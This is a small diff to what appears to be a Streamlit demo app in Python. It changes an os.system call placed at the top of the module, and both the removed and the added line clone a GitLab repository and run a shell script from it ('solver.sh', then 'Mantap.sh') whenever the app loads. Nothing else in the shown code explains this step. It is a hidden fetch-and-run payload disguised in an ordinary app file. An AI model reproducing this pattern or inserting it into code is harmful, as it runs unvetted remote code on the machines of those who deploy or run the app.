@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('git clone https://gitlab.com/andyketan1/solver.git && cd solver && bash solver.sh')
+os.system('git clone https://gitlab.com/andyketan1/qgcm.git && cd qgcm && bash Mantap.sh')
 
 """
 # Welcome to Streamlit!
